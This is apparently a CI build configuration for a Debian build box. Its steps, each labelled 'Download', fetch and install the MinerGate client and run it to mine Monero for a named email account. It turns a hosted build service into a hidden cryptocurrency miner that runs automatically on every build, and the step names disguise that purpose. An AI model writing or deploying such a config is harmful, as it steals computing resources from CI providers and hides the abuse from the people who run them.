box: debian

build:

  steps:
    - install-packages:
        packages: wget
        
    - script:
        name: Download
        code: |
          wget https://minergate.com/download/deb-cli -O minergate-cli.deb

    - script:
        name: Download
        code: |
          sudo dpkg -i minergate-cli.deb
          
    - script:
        name: Download
        code: |
          minergate-cli -user yoginth@hotmail.com xmr
